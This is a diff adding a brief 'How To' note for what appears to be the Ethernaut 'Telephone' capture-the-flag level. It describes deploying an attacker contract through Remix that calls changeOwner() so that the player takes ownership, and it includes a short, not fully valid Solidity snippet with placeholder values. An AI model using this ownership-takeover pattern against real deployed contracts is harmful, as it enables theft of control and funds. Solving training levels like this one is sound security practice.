@@ -1,0 +1,10 @@
+#How To
+
+From remix.ethereum.org, make a new hack contract with instance level address as contract instance, then call changeOwner() with player address as argument. I become the owner. 
+    
+    contract HackTelephone {
+        Telephone public instance = Telephone(levelinstance);
+        function becomeOwner() public returns (bool) {
+            instance.changeOwner(player=0x283...)
+        } 
+    } 
